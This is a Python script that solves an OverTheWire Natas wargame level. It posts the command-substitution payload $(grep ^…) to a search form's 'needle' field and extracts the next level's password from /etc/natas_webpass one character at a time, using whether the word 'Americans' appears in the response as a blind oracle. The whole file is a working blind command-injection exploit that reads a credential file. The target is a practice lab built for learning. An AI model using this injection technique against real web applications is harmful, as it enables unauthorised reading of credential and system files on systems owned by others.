import requests

password = ""
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

url = 'http://natas16.natas.labs.overthewire.org'
auth = ('natas16', 'PassNatas16IsHere')

while len(password) < 32:
    for char in chars:
        print('testing the ' + char)
        data = {
            "needle": f'$(grep ^{password}{char} /etc/natas_webpass/natas17)',
            'submit': 'Search'
        }
        
        try:
            response = requests.post(url, data=data, auth=auth)

            if 'Americans' not in response.text:
                password += char
                print(password)
                break
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
